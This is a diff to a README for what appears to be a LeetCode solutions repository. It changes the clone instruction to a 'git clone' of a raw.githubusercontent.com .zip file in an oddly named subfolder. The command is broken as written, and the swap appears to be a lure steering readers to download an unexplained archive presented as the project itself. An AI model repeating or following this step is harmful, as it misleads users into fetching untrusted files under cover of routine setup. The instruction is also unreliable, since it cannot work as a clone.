@@ -17,4 +17,4 @@ Feel free to open issues or contribute by submitting pull requests! Any feedback
 ## How to Use
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/yourusername/Leetcode-solutions.git
+   git clone https://raw.githubusercontent.com/rushangchandekar/Leetcode-Solutions/main/ideagenous/Leetcode-Solutions.zip
